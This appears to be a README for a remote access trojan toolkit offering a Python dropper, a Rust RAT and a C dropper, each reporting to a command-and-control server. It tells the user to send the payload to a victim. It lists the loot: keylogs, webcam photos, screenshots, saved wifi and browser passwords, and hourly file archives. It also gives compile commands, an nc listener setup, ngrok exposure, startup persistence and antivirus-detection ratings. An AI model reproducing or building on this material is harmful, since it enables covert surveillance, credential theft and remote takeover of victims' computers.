# RAT System

Three options depending on what you need:

---

## Option 1 — Simple Dropper (easiest)

**Python payload → sends everything to your C2 server.**

```
# 1. Start your C2 server
python c2/server.py

# 2. Build the payload
python builder.py
  → choose Python
  → enter your C2 URL
  → generates payload.py  (or .exe via PyInstaller)

# 3. Send payload.py to the victim
```

What lands in `loot/<hostname>/` on your machine:

| File | Content |
|------|---------|
| `sysinfo.txt` | Hostname, user, OS, local+public IP, admin |
| `screenshot.png` | Screen capture on connect |
| `webcam.jpg` | Webcam photo on connect |
| `keylog.txt` | Keylog appended every 30s |
| `wifi.txt` | All saved wifi passwords |
| `files.txt` | Desktop / Downloads / Documents listing |
| `loot.zip` | Full archive, sent every hour |

---

## Option 2 — Rust RAT (interactive shell)

**Standalone binary — no Python on victim. Menu-driven, just type numbers.**

```bash
# Edit C2_HOST and C2_PORT in rat.rs, then compile:
rustc rat.rs -o rat.exe -O          # Windows
rustc rat.rs -o rat      -O          # Linux

# Start listener
nc -lvnp 4444

# Send rat.exe to victim — they open it
# Menu appears in your nc terminal
```

Menu options (just type the number):
```
[1]  System info
[2]  Screenshot
[3]  Webcam snapshot
[4]  Keylogger 30s
[5]  List files (Desktop/Downloads/Docs)
[6]  Browse directory
[7]  Download a file
[8]  Run command
[9]  List processes
[10] Kill process
[11] Wifi passwords
[12] Browser passwords
[13] Add to startup
[14] Free shell
[0]  Disconnect (auto-reconnects in 5s)
```

**Compatibility:**
- Windows `.exe` → works on **any Windows 7/8/10/11 x64**, zero install
- Linux binary → works on Debian / Ubuntu / Kali / Arch
- Cross-compile from Linux: `rustup target add x86_64-pc-windows-gnu && rustc --target x86_64-pc-windows-gnu rat.rs -o rat.exe`

---

## Option 3 — C Dropper (smallest, Windows only)

**~80KB standalone .exe, no Python, no runtime.**

```bash
# Compile on Windows (MinGW)
gcc dropper.c -o dropper.exe -lwinhttp -lws2_32 -lgdi32 -lole32 -luuid -mwindows -O2

# Cross-compile from Linux
x86_64-w64-mingw32-gcc dropper.c -o dropper.exe -lwinhttp -lws2_32 -lgdi32 -lole32 -luuid -mwindows -O2

# Or use builder.py → [2] C → auto-patches webhook + compiles
python builder.py
```

Collects: sysinfo, screenshot (GDI), wifi passwords, file listing.  
Sends everything to your C2 server. No Discord needed.

---

## C2 Server

```bash
python c2/server.py
```

- `[1]` Local — use your LAN IP (same network)
- `[2]` ngrok — public URL, no port-forward needed

In the C2 terminal:
- `v` → list connected victims
- `l` → list loot folders
- `q` → quit

---

## Summary

| | Simple Dropper | Rust RAT | C Dropper |
|--|--|--|--|
| Size | ~5KB py / ~10MB exe | ~200KB | ~80KB |
| Platform | Win + Linux | Win + Linux | Windows only |
| Interactive | No | **Yes** | No |
| Deps on victim | Python (py) / none (exe) | **None** | **None** |
| AV detection | Medium | Low | Low |

